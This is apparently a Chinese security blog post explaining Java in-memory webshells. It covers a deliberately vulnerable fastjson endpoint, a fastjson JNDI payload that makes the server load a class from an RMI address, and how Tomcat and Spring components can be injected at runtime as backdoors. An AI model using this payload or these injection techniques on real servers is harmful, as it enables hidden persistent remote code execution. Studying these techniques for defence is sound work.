# JAVA内存马

## 内存马的攻击面

webshell实际上也是一种web服务，那么从创建web服务的角度考虑，自顶向下，有下面几种手段和思路：

1. 动态注册/字节码替换 interceptor/controller（使用框架如 spring/struts2/jfinal）
2. 动态注册/字节码替换 使用`责任链设计模式`的中间件、框架的实现（例如 Tomcat 的 Pipeline & Valve，Grizzly 的 FilterChain & Filter 等等）
3. 动态注册/字节码替换 servlet-api 的具体实现 servlet/filter/listener
4. 动态注册/字节码替换一些定时任务的具体实现，比如 TimeTask等

另外，换一个角度来说，webshell作为一个后门，实际上我们需要他完成的工作是能接收到恶意输入，执行恶意输入并回显。那么我们可以考虑启动一个进程或线程，无限循环等待恶意输入并执行代码来作为一个后门。

## 环境准备

> jdk 8u102
> springboot 2.5.5 (Tomcat embedded)
> fastjson 1.2.47

```java
public class vuljson {
    @RequestMapping("/json")
    @ResponseBody
    public String vulJson(@RequestBody String input){
        System.out.println(input);
        Object o = JSON.parseObject(input);
        return "Successed!";
    }
}
```

payload

```json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://127.0.0.1:1099/badNameClass",
        "autoCommit":true
    }
}
```

运行截图

![image-20220710095401938](https://img.dem0dem0.top/images/image-20220710095401938.png)

## Tomcat 动态注册

### 动态注入Servlet

java web中的`servlet+Filter+Listener`的注册方式

- xml文件注册
- 注解注册(Servlet 3.0+)
- ServletContext动态注册

首先一起来看看ServletContext的方法`addServlet`

```java
    private javax.servlet.ServletRegistration.Dynamic addServlet(String servletName, String servletClass, Servlet servlet, Map<String, String> initParams) throws IllegalStateException {
        if (servletName != null && !servletName.equals("")) {//servletName不为空
            if (!this.context.getState().equals(LifecycleState.STARTING_PREP)) {//判断当前程序的状态
                throw new IllegalStateException(sm.getString("applicationContext.addServlet.ise", new Object[]{this.getContextPath()}));
            } else {
                Wrapper wrapper = (Wrapper)this.context.findChild(servletName);
                if (wrapper == null) {//判断是否已经注册了
                    wrapper = this.context.createWrapper();
                    wrapper.setName(servletName
                    this.context.addChild(wrapper);
                } else if (wrapper.getName() != null && wrapper.getServletClass() != null) {
                    if (!wrapper.isOverridable()) {
                        return null;
                    }

                    wrapper.setOverridable(false);
                }

                ServletSecurity annotation = null;
                if (servlet == null) {
                    wrapper.setServletClass(servletClass);
                    Class<?> clazz = Introspection.loadClass(this.context, servletClass);
                    if (clazz != null) {
                        annotation = (ServletSecurity)clazz.getAnnotation(ServletSecurity.class);
                    }
                } else {
                    wrapper.setServletClass(servlet.getClass().getName());
                    wrapper.setServlet(servlet);
                    if (this.context.wasCreatedDynamicServlet(servlet)) {
                        annotation = (ServletSecurity)servlet.getClass().getAnnotation(ServletSecurity.class);
                    }
                }

                if (initParams != null) {
                    Iterator var9 = initParams.entrySet().iterator();

                    while(var9.hasNext()) {
                        Entry<String, String> initParam = (Entry)var9.next();
                        wrapper.addInitParameter((String)initParam.getKey(), (String)initParam.getValue());
                    }
                }

                javax.servlet.ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, this.context);
                if (annotation != null) {
                    registration.setServletSecurity(new ServletSecurityElement(annotation));
                }

                return registration;
            }
        } else {
            throw new IllegalArgumentException(sm.getString("applicationContext.invalidServletName", new Object[]{servletName}));
        }
    }
```

将上面的代码简化抽象出来

```java
String servletName="";
Servlet servlet = "";
Wrapper wrapper = (Wrapper)this.context.findChild(servletName);
if (wrapper == null) {
 wrapper = this.context.createWrapper();
 wrapper.setName(servletName);
 this.context.addChild(wrapper);
 
}else{

}
wrapper.setServletClass(servlet.getClass().getName());
wrapper.setServlet(servlet);
wrapper.setLoadOnStartup(1);//Set the load-on-startup order value 
```

但是我们如果直接把上诉的代码直接运行，在一次访问到达 Tomcat 时，是如何匹配到具体的 Servlet 的？

- ApplicationServletRegistration 的 `addMapping` 方法调用 `StandardContext#addServletMapping` 方法，在 mapper 中添加 URL 路径与 Wrapper 对象的映射（Wrapper 通过 this.children 中根据 name 获取）
- 同时在 servletMappings 中添加 URL 路径与 name 的映射。

那么我们就需要在代码中添加下面几句

```
this.context.addServletMapping("/dem0", servletName);
```

基本流程:

1. 获取 ServletContext
2. 获取 Tomcat 对应的 StandardContext
3. 构建新 servlet warpper
4. 将构建好的 warpper 添加到 standardContext 中，并加入 servletMappings

常见的Context

![图片](https://img.dem0dem0.top/images/640)

- **WebApplicationContext:** 其实这个接口其实是SpringFramework ApplicationContext接口的一个子接口，对应着我们的web应用。它在ApplicationContext的基础上，添加了对ServletContext的引用，即getServletContext方法。因此在注入内存马的过程中，我们可以利用他来拿到ServletContext。

- **ServeltContext:** 这个就是我们之前说的servlet-api给的规范servlet用来与容器间进行交互的接口的组合，这个接口定义了一系列的方法来描述上下文（Cotext），servlet通过这些方法可以很方便地与自己所在的容器进行一些交互，比如通过getMajorVersion与getMinorVersion来获取容器的版本信息等。(应用初始化时使用)

- **StandardContext:** 这个是tomcat中间件对servlet规范中servletContext的实现，在之前的tomcat架构图中可以看到他的作用位置，用来管理Wrapper。

> 如何获取ServletContext/StandardContext？
>
> - 通过获取上下文的http请求信息来获得servletContext，在这个例子中就是通过ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()找到了WebApplicationContext，进而找到了ServletContext。
> - 通过在tocmcat启动的http线程中遍历找到有用的信息。据tomcat的架构我们可以自顶向下找到线程对应的servletContext。bitterz师傅给出了一条tomcat全版本的利用链

### 动态注入Filter

Filter:过滤器，是java-web中常用的技术，通常用来处理`静态web资源`，`访问权限控制`,`记录日志`.一般一次请求到服务器中，先由filter对用户请求继续宁预处理，再交给servlet.

Filter的配置再配置文件和注解中，在其他代码中如果想要完成注册，主要有以下方式：

- 使用 ServletContext 的 addFilter/createFilter 方法注册；
- 使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册（将会在 Listener 中进行描述）；
- 使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态，后面会描述）。

这里先只讨论使用servletContext的addFilter方法。废话不多说，直接上源码

```java
    private FilterRegistration.Dynamic addFilter(String filterName,
            String filterClass, Filter filter) throws IllegalStateException {

        if (filterName == null || filterName.equals("")) {
            throw new IllegalArgumentException(sm.getString(
                    "applicationContext.invalidFilterName", filterName));
        }

        if (!context.getState().equals(LifecycleState.STARTING_PREP)) {
            //TODO Spec breaking enhancement to ignore this restriction
            throw new IllegalStateException(
                    sm.getString("applicationContext.addFilter.ise",
                            getContextPath()));
        }

        FilterDef filterDef = context.findFilterDef(filterName);

        // Assume a 'complete' FilterRegistration is one that has a class and
        // a name
        if (filterDef == null) {
            filterDef = new FilterDef();
            filterDef.setFilterName(filterName);
            context.addFilterDef(filterDef);
        } else {
            if (filterDef.getFilterName() != null &&
                    filterDef.getFilterClass() != null) {
                return null;
            }
        }

        if (filter == null) {
            filterDef.setFilterClass(filterClass);
        } else {
            filterDef.setFilterClass(filter.getClass().getName());
            filterDef.setFilter(filter);
        }

        return new ApplicationFilterRegistration(filterDef, context);
    }
```

但是我们有了上面的分析经验，不难看出这里，最后只是返回了`new `对象。这样是不能完成加载的。

有过开发的经验的，都知道filter调用之后，都要返回到`filterChain`,于是就想是不是可以直接操作`filterChain`，这个类的实现方式中的确提供了`addFilter`方法，但是`对于每个请求需要执行的filterChain都是动态取得的`。那`Tomcat`具体是怎么处理的呢？

- 在 context 中获取 filterMaps，并遍历匹配 url 地址和请求是否匹配；
- 如果匹配则在 context 中根据 filterMaps 中的 filterName 查找对应的 filterConfig；
- 如果获取到 filterConfig，则将其加入到 filterChain 中
- 循环fileterChain中的filterConfig，通过`getFilter`方法获取filter并且执行doFilter.

所以每次请求的filterChain都是动态匹配生成的，如果想添加的话，就必须` StandardContext 中 filterMaps 中添加 FilterMap`.

那么如果现在想要动态添加一个`filter`,需要在`context`中的filterMaps中添加FilterMap，在filetrConfigs中添加`filterConfig`,这样在程序创建的时候就找到filter了。

在StandardContext的filterStart方法中生成filterConfig。所以现在添加filter的思路大概就是

- 调用 ApplicationContext 的 addFilter 方法创建 filterDefs 对象，需要反射修改应用程序的运行状态，加完之后再改回来；
- 调用 StandardContext 的 filterStart 方法生成 filterConfigs；
- 调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps；
- 为了兼容：建议把我们的filter放在首位。

### 动态注入Listener

应用中常见的Listener

- ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）
- ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）
- ServletRequestListener：对 Request 请求进行监听（创建、销毁）
- ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）
- javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听
- javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听

前面中我们可以看到许多的Listener，这次要使用的Listener是`ServletRequestListener`（监听request的response的产生和销毁）,在`Tomcat`中的他存储在` StandardContext #applicationEventListenersObjects`。

![image-20220717155533621](https://img.dem0dem0.top/images/image-20220717155533621.png)

可以看到有两个方法`requestInitialized` 和 `requestDestroyed`.两个方法均接收 ServletRequestEvent 作为参数，ServletRequestEvent 中又储存了 ServletContext 对象和 ServletRequest 对象，因此在访问请求过程中我们可以在 request 创建和销毁时实现自己的恶意代码，完成内存马的实现。一起来注意玩法

#### 拓展:

![image-20220717181219915](https://img.dem0dem0.top/images/image-20220717181219915.png)

### 控制器 拦截器 管道

上面的tomcat三件套是不是和Spring MVC 一模一样，让我们快点来试一试把。

#### 动态注入Controller

> [SpringMVC源码之Controller查找原理 - 卧颜沉默 - 博客园 (cnblogs.com)](https://www.cnblogs.com/w-y-c-m/p/8416630.html)

首先看一下`Spring MVC`对于`Controller`本身的处理。看以下两个类

- RequestMappingInfo: 一个封装类，对一次http请求中的信息进行封装
- HandlerMethod: 对Controller中的处理请求方法进行封装，里面包含了的该方法所属的bean,method,参数等。

`RequestMappingHandlerMapping`是spring中用来处理`@Controller`注解类中的方法级别`@RequestMapping`以及`RequestMappingInfo`实例的创建。下面看一下具体的流程。

因为`MVC`在初始化时，在每个容器的 bean 构造方法、属性设置之后，将会使用 InitializingBean 的 `afterPropertiesSet` 方法进行 Bean 的初始化操作。所以上面这个类先看他的这个方法

![](https://img.dem0dem0.top/images/image-20220717182928738.png)

不难发现其实就两步，

- 创建一个`RequestMappingInfo.BuilderConfiguration()`
- 调用父类的`afterPropertiesSet`

这里的父类是`AbstractHandlerMethodMapping`.就调用了一个方法。

![image-20220717183213812](https://img.dem0dem0.top/images/image-20220717183213812.png)

在这个方法中

![image-20220717183357804](https://img.dem0dem0.top/images/image-20220717183357804.png)

![image-20220717183525248](https://img.dem0dem0.top/images/image-20220717183525248.png)

`detectHandlerMethods`方法

![image-20220717184106090](https://img.dem0dem0.top/images/image-20220717184106090.png)

遍历并且注册

![image-20220717184143260](https://img.dem0dem0.top/images/image-20220717184143260.png)

关键信息记录

![image-20220717184235967](https://img.dem0dem0.top/images/image-20220717184235967.png)
上面都是初始化的流程，下面是查找流程:

在 AbstractHandlerMethodMapping 的 lookupHandlerMethod 方法：

- 在 MappingRegistry.urlLookup 中获取直接匹配的 RequestMappingInfos
- 如果没有，则遍历所有的 MappingRegistry.mappingLookup 中保存的 RequestMappingInfos
- 获取最佳匹配的 RequestMappingInfo 对应的 HandlerMethod

下面就是动态注册`Controller`.Landgrey师傅在他的[blog](https://landgrey.me/blog/12/)里面记录了很多的接口可以使用。这里我们选择比较简单的。具体代码见`EvilController`,这是一种比较简单的实现，具体困难的实现和现实情况中的bypass，就靠后续的完善了。

#### 动态注册拦截器

拦截器是Spring使用`AOP`对于`Filter`思想的另外一种实现，在其他的框架中也有拦截器的思想。

简单用`su18`师傅的话来总结一下，拦截器的工作流程。

![image-20220717193925778](https://img.dem0dem0.top/images/image-20220717193925778.png)

![image-20220717194058281](https://img.dem0dem0.top/images/image-20220717194058281.png)

#### Tomcat Valve 注入

> [Tomcat中容器的pipeline机制 - coldridgeValley - 博客园 (cnblogs.com)](https://www.cnblogs.com/coldridgeValley/p/5816414.html) 

简单介绍一下，具体的参考上面的链接。这里涉及了`Tomcat`是如何处理和传递`request`和`response`的。Tomcat采取的是职责链模式，它定义了两个接口`Pipeline`和`Valve`.

![img](https://su18.org/post-images/1623645442719.jpg)

然后按照下面这样经营着。数据从连接器到每一个Valve然后再通过Pipeline(addValve方法可以添加)传递到下一个Valve。下面是他们的定义。

![image-20220717220156384](https://img.dem0dem0.top/images/image-20220717220156384.png)

`Valve#invoke`就是执行业务逻辑的地方。

![image-20220717220230869](https://img.dem0dem0.top/images/image-20220717220230869.png)

Tomcat中的Pipeline仅有一个实现就是` StandardPipeline`,存放在`ContainerBase 的 pipeline 属性中`.并且 ContainerBase 提供 `addValve` 方法调用 StandardPipeline 的 addValve 方法添加。Tomcat中的四个层级都继承了ContainerBase，所以哪个层级都可以添加自定义的Valve均可。添加后，将会在 `org.apache.catalina.connector.CoyoteAdapter` 的 `service` 方法中调用 Valve 的 `invoke` 方法。接下来去实现即可。

### 进程注入

> https://cn-sec.com/archives/710084.html

利用的是java中timer的特性，启动Timer进程，在其中执行webshell的逻辑，如果不是所有已经完成的任务都已经完成执行，或不调用Timer对象的cancel方法，这个线程就不会停止，也不会回收。因为不在web的上下文中，可能找到reqeust和response有困难，但是我们可以遍历线程。(可是这样需要碰撞才行，很离谱。。。)

## TODO

- JAVA Agent注入
- 内存马攻防

## 参考资料

- [内存马攻防实战--攻击基础篇](https://mp.weixin.qq.com/s/HODFJF3NJmsDW2Lcd-ebIg)主要是一些基础知识
- [手把手教会你防御Java内存马](https://mp.weixin.qq.com/s/OVsdm6DST6ISgMy5rkBAiA)
- [动态注册之Servlet+Filter+Listener](https://www.jianshu.com/p/cbe1c3174d41)
- [JavaWeb 内存马一周目通关攻略](https://su18.org/post/memory-shell)